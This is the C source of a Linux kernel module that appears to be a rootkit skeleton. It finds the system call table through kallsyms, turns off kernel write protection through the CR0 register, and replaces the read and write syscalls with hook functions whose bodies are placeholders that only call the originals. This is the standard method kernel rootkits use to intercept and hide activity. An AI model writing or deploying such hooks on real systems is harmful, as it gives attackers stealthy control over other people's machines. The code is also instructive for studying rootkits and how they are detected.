#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>

unsigned long **SYS_CALL_TABLE;

#define bitMe() write_cr0(read_cr0() & (~0x10000))
#define unBitMe() write_cr0(read_cr0() | 0x10000)

asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
asmlinkage int rk_write(unsigned int fd, const char __user* buf, size_t count) {
	// put your code here
	return (*original_write)(fd, buf, count);
}

asmlinkage int (*original_read)(unsigned int, void __user*, size_t);
asmlinkage int rk_read(unsigned int fd, void __user* buf, size_t count) {
	// put your code here
	return (*original_read)(fd, buf, count);
}

static int __init rk_init(void) {
	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");

	printk(KERN_INFO "Hello.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

	bitMe();
	//hook write()
	original_write = (void*)SYS_CALL_TABLE[__NR_write];
	SYS_CALL_TABLE[__NR_write] = (unsigned long*)rk_write;
	//hook read();
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)rk_read;
	unBitMe();

	return 0;
}

static void __exit rk_exit(void) {

	bitMe();
	//unhook write()
	SYS_CALL_TABLE[__NR_write] = (unsigned long*)original_write;
	//unhook read()
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
	unBitMe();

	printk(KERN_INFO "Goodbye.");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aearnus");
MODULE_DESCRIPTION("I'm sorry.");
MODULE_VERSION("0");
module_init(rk_init);
module_exit(rk_exit);
